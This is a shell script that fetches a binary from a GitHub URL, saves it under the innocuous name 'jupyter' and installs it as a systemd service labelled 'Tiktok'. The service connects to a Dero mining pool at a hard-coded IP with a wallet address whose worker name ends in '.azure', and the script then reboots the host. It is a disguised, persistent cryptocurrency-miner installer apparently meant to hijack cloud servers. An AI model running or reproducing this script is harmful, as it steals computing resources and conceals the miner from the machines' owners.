cd /home
sudo wget -O jupyter https://github.com/cikimachine/maimunah/raw/main/uranus
sudo apt update
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/jupyter -o tcp://198.187.30.27:80 -u dero1qy25yfyzw00d5t0mt8pvtd9t4p7zp8x3zl06pwkhaj4zkuqhnmnv2qgakr6u7.azure\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
sudo systemctl daemon-reload
sudo systemctl enable deroz.service
echo "Setup completed!"
sudo reboot
